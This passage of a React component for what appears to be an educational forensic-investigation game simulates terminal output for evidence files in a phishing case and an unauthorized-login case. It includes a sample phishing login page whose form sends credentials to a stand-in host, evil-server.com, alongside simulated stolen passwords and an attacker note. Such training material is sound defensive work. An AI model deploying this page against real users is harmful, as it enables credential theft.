            '🔴 2024-03-15 14:36:45 | mike  | company-reset.com/login',
            '🔴 2024-03-15 14:38:12 | lisa  | company-reset.com/login',
            '🔴 2024-03-15 14:40:33 | sarah | company-reset.com/submit',
            '🔴 2024-03-15 14:42:18 | mike  | company-reset.com/submit',
            '🔴 2024-03-15 14:45:07 | lisa  | company-reset.com/submit',
            '',
            '2024-03-15 15:30:44 | sarah | company.com/hr',
            '',
            '────────────────────────────────────',
            '💡 Open this file in Log Viewer to save Discovery #2!'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // PHISHING_PAGE.HTML
        if ((currentPath.includes('suspicious_files') || currentPath.includes('suspicious')) && 
            (file === 'phishing_page.html' || file === 'phishing_page')) {
          const output = [
            '<!DOCTYPE html>',
            '<html>',
            '<head>',
            '  <title>Company Email Login</title>',
            '</head>',
            '<body>',
            '  <div class="login-box">',
            '    <h2>Company Email Login</h2>',
            '    <form action="http://evil-server.com/steal.php" method="POST">',
            '      <input type="email" name="username" placeholder="Email">',
            '      <input type="password" name="password" placeholder="Password">',
            '      <button type="submit">LOGIN TO KEEP PASSWORD</button>',
            '    </form>',
            '  </div>',
            '</body>',
            '</html>',
            '',
            '────────────────────────────────────',
            '⚠️ FORM ACTION: http://evil-server.com/steal.php',
            '────────────────────────────────────',
            '',
            '══════════════════════════════════════════════════',
            '✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #3'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // CREDENTIALS.TXT
        if ((currentPath.includes('suspicious_files') || currentPath.includes('suspicious')) && 
            (file === 'credentials.txt' || file === 'credentials')) {
          const output = [
            '[SIMULATED DATA - CAPTURED BY ATTACKER]',
            '',
            'TIMESTAMP: 2024-03-15 14:40:22',
            '──────────────────────────────────',
            'Username: sarah@company.com',
            'Password: Summer2024!',
            '──────────────────────────────────',
            '',
            'TIMESTAMP: 2024-03-15 14:42:35',
            '──────────────────────────────────',
            'Username: mike@company.com',
            'Password: sales123',
            '──────────────────────────────────',
            '',
            'TIMESTAMP: 2024-03-15 14:45:17',
            '──────────────────────────────────',
            'Username: lisa@company.com',
            'Password: finance2024',
            '──────────────────────────────────',
            '',
            '[ATTACKER NOTE]',
            '"HR account has access to employee records.',
            ' Sales account is low value.',
            ' Finance account has payment systems.',
            ' Will try these on company VPN tonight."',
            '',
            '══════════════════════════════════════════════════',
            '✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #5'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        return [`cat: ${file}: No such file in ${currentPath}`];
        
      } else {
        // CASE #101
        // Discovery 3: shifts.csv
        if ((currentPath === `/evidence/case101/employees` || currentPath.includes('employees')) && 
            (file === 'shifts.csv' || file === 'shifts')) {
          const output = [
            'username,date,shift',
            'jdoe,2024-03-15,DAY',
            'smith,2024-03-15,DAY',
            'park,2024-03-15,NIGHT',
            'jdoe,2024-03-16,OFF  ← 🔴 JOHN WAS OFF WORK! ⭐ DISCOVERY #3',
            'smith,2024-03-16,DAY',
            'park,2024-03-16,NIGHT',
            '',
            '══════════════════════════════════════════════════',
            '✅ Click COPY TO NOTES to save this discovery! (+15 XP)'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // Discovery 4: permissions.txt
        if ((currentPath === `/evidence/case101/system_info` || currentPath.includes('system_info')) && 
            (file === 'permissions.txt' || file === 'permissions')) {
          const output = [
            'USER ACCESS LEVELS:',
            '-------------------',
            'jdoe (Marketing): HR_READ, SALES_READ, MARKETING_WRITE  ← ⭐ DISCOVERY #4',
            'smith (Sales): SALES_READ, SALES_WRITE',
            'park (IT): ADMIN, LOGS_READ, DATABASE_WRITE',
            '',
            'NOTE: Marketing managers should NOT have HR access.',
            'This explains why the attacker targeted John!',
            '',
            '══════════════════════════════════════════════════',
            '✅ Click COPY TO NOTES to save this discovery! (+15 XP)'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        // auth.log preview
        if ((currentPath === `/evidence/case101/logs` || currentPath.includes('logs')) && 
            file === 'auth.log') {
          const output = [
            '2024-03-15 08:23:12 LOGIN_SUCCESS jdoe 10.0.0.45',
            '2024-03-15 08:24:33 LOGIN_SUCCESS smith 10.0.0.67',
            '2024-03-15 08:25:18 LOGIN_SUCCESS park 10.0.0.89',
            '... (24 more normal entries)',
            '',
            '🔴 2024-03-16 02:58:12 LOGIN_FAILED jdoe 10.12.45.89  ← ⭐ PART OF DISCOVERY #2',
            '🔴 2024-03-16 02:59:03 LOGIN_FAILED jdoe 10.12.45.89  ← ⭐ PART OF DISCOVERY #2',
            '🟡 2024-03-16 03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89  ← ⭐ DISCOVERY #1',
            '🟡 2024-03-16 03:15:22 QUERY_EXEC jdoe hr_database',
            '🟡 2024-03-16 03:16:45 LOGOUT jdoe 10.12.45.89',
            '',
            '2024-03-16 08:20:33 LOGIN_SUCCESS jdoe 10.0.0.45',
            '',
            '══════════════════════════════════════════════════',
            '💡 Select suspicious rows in Log Viewer for discoveries #1 and #2!'
          ];
          const outputString = output.join('\n');
          setLastCommandOutput(outputString);
          return output;
        }
        
        return [`cat: ${file}: No such file in ${currentPath}`];
      }
    }

    if (mainCmd === 'grep' && caseId === '101') {
      if (args.length < 3) return ['Usage: grep [pattern] [file]'];
      
      const pattern = args[1].replace(/['"]/g, '');
      const file = args[2];
      
      if ((currentPath === `/evidence/case101/logs` || currentPath.includes('logs')) && 
          file === 'auth.log' && pattern.includes('10.12.45.89')) {
        const output = [
          `Searching for '${pattern}' in auth.log...`,
          '',
          '2024-03-16 02:58:12 LOGIN_FAILED jdoe 10.12.45.89',
          '2024-03-16 02:59:03 LOGIN_FAILED jdoe 10.12.45.89',
          '2024-03-16 03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89',
          '2024-03-16 03:15:22 QUERY_EXEC jdoe hr_database',
          '2024-03-16 03:16:45 LOGOUT jdoe 10.12.45.89',
          '',
          'Found 5 matches',
          '',
          '══════════════════════════════════════════════════',
          '✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #5'
        ];
        const outputString = output.join('\n');
        setLastCommandOutput(outputString);
        return output;
      }
      
      setLastCommandOutput(`grep: Pattern '${pattern}' not found in ${file}`);
      return [`grep: Pattern '${pattern}' not found in ${file}`];
    }

    setLastCommandOutput(`Command not found: ${mainCmd}. Type 'help'`);
    return [`Command not found: ${mainCmd}. Type 'help'`];
  };

  const handleCommand = (input) => {
    setLines(prev => [...prev, 
      { type: 'input', content: `${currentPath}$ ${input}` }
    ]);

    const output = processCommand(input);
    
    output.forEach(line => {
      setLines(prev => [...prev, { type: 'output', content: line }]);
    });
    
    setLines(prev => [...prev, { type: 'output', content: '' }]);

    if (input.trim()) {
      setCommandHistory(prev => [...prev, input]);
    }
    setHistoryIndex(-1);
  };

  const getTotalDiscoveries = () => {
    return caseId === '102' ? 6 : 5;
  };

  const getCaseColor = () => {
    return caseId === '102' ? '#06b6d4' : '#eab308';
  };

  return (
    <div className="terminal-container">
      {/* ===== FIXED: Guidance Popup with proper close handler ===== */}
      {showGuidance && currentDiscovery && (
        <GuidancePopup
          discovery={currentDiscovery}
          onClose={handlePopupClose}
          onAction={handlePopupAction}
        />
      )}

      {copySuccess && (
        <div style={{
          position: 'fixed',
          top: '20px',
          right: '20px',
          background: copyMessage.includes('DISCOVERY') ? '#fbbf24' : '#00b4d8',
          color: copyMessage.includes('DISCOVERY') ? '#000' : '#fff',
          padding: '1rem',
          borderRadius: '0.5rem',
          zIndex: 1000,
          animation: 'slideIn 0.3s ease',
          boxShadow: '0 4px 12px rgba(0,0,0,0.3)'
        }}>
          {copyMessage}
        </div>
      )}

      <div className="terminal-header">
        <div className="flex items-center gap-3">
          <TerminalIcon className="w-5 h-5 text-green-400" />
          <span className="text-white font-semibold">
            Terminal - Case #{caseId}: {caseId === '102' ? 'The Phishing Trap' : 'The Unauthorized Login'}
          </span>
          <div className="flex items-center gap-2 ml-4">
            <Award className="w-4 h-4 text-yellow-400" />
            <span className="text-white text-sm">{totalXP} XP</span>
            <span className="text-gray-400 ml-2">
              Discoveries: {discoveries.length}/{getTotalDiscoveries()}
            </span>
          </div>
          
          <div style={{
            background: caseId === '102' ? 'rgba(6,182,212,0.15)' : 'rgba(234,179,8,0.15)',
            border: `1px solid ${getCaseColor()}`,
            borderRadius: '1rem',
            padding: '0.2rem 0.8rem',
            fontSize: '0.75rem',
            color: getCaseColor(),
          }}>
            Case #{caseId}
          </div>
        </div>
        
        <div className="flex items-center gap-2">
          <button
            onClick={handleCopyToNotes}
            style={{
              background: lastCommandOutput ? '#00b4d8' : '#1a1d3a',
              border: '1px solid #00b4d8',
              color: 'white',
              padding: '0.375rem 1rem',
              borderRadius: '0.375rem',
              cursor: lastCommandOutput ? 'pointer' : 'not-allowed',
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem',
              opacity: lastCommandOutput ? 1 : 0.5
            }}
            disabled={!lastCommandOutput}
          >
            <Copy size={14} />
            Copy to Notes
            {lastCommandOutput && (lastCommandOutput.includes('DISCOVERY') || 
              lastCommandOutput.includes('OFF') || 
              lastCommandOutput.includes('HR_READ') ||
              lastCommandOutput.includes('Found 5 matches') ||
              lastCommandOutput.includes('185.142.53.89') ||
              lastCommandOutput.includes('evil-server')) && (
              <span style={{ 
                background: '#fbbf24', 
                color: '#000', 
                padding: '0.1rem 0.4rem', 
                borderRadius: '1rem',
                fontSize: '0.7rem',
                fontWeight: 'bold',
                marginLeft: '0.25rem'
              }}>
                +XP
              </span>
            )}
          </button>
          
          <button
            onClick={() => {
              setLines(prev => [...prev,
                { type: 'system', content: '' },
                { type: 'warning', content: getNextHint() },
                { type: 'system', content: '' }
              ]);
            }}
            style={{
              background: 'transparent',
              border: `1px solid ${getCaseColor()}`,
              color: getCaseColor(),
              padding: '0.375rem 1rem',
              borderRadius: '0.375rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '0.25rem'
            }}
          >
            <HelpCircle size={14} />
            Hint
          </button>
          
          <button onClick={() => navigate('/os-desktop', { state: { userId, caseId: `#${caseId}` } })} className="window-control">
            ✕
          </button>
        </div>
      </div>

      <div className="terminal-content" ref={terminalRef} onClick={handleTerminalClick}>
        {lines.map((line, index) => (
          <TerminalLine key={index} line={line} />
        ))}
        <TerminalPrompt 
          ref={inputRef}
          onSubmit={handleCommand}
          history={commandHistory}
          historyIndex={historyIndex}
          setHistoryIndex={setHistoryIndex}
          currentPath={currentPath}
        />
      </div>

      <div className="terminal-statusbar">
        <div className="status-left">
          <span className="status-indicator"></span>
          <span>Discoveries: <span className="discovery-count">{discoveries.length}/{getTotalDiscoveries()}</span></span>
        </div>
        <div className="status-right">
          <span className="path">{currentPath}</span>
          <span className="separator">|</span>
          <span>{lastCommand ? `Last: ${lastCommand}` : 'Ready'}</span>
        </div>
      </div>
    </div>
  );
};

export default Terminal;